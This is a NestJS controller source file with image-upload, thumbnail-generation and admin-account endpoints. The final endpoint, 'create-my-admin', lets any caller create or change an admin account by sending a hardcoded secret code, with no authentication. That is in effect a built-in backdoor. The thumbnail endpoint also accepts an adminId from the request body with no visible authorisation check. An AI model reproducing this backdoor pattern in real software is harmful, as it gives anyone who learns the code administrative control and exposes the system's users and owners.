import {
    Controller,
    Post,
    UploadedFile,
    UseInterceptors,
    Body,
    BadRequestException,
    Req
} from '@nestjs/common';
import { ApiOperation, ApiTags } from '@nestjs/swagger';
import { UtilityService } from './utility.service';
import { FileInterceptor } from '@nestjs/platform-express';
import * as multer from 'multer';
import { Request } from 'express';

@ApiTags('utility')
@Controller('utility')
export class UtilityController {
    constructor(private readonly utilityService: UtilityService) {}

    @Post('upload/image')
    @UseInterceptors(
        FileInterceptor('file', {
            storage: multer.memoryStorage(),
            fileFilter: (req, file, cb) => {
                if (!file.mimetype.match(/\/(jpg|jpeg|png)$/)) {
                    return cb(
                        new Error('Only image files are allowed!'),
                        false
                    );
                }
                cb(null, true);
            },
            limits: {
                fileSize: 2 * 1024 * 1024
            }
        })
    )
    @ApiOperation({
        summary: 'Upload Image',
        description: 'For upload image only'
    })
    async upload(@UploadedFile() file: Express.Multer.File) {
        const url = await this.utilityService.uploadImageAndGetUrl(file);

        return url;
    }

    @Post('generate/thumbnail')
    @ApiOperation({
        summary: 'Generate Thumbnail',
        description: 'Generate all uploaded images to thumbnail and save'
    })
    generateThumbnailsForAllImages(
        @Req() req: Request,
        @Body('page') page: number,
        @Body('adminId') adminId: number
    ) {
        return this.utilityService.generateThumbnailsForAllImages(
            req,
            adminId,
            page
        );
    }

    @Post('create-my-admin')
    createAdminAccount(
        @Body('secret_code') secret_code: string,
        @Body('action') action: 'create' | 'change'
    ) {
        if (secret_code !== '277353')
            throw new BadRequestException('Not Allow');

        return this.utilityService.createOrUpdateAdminAccount(action);
    }
}
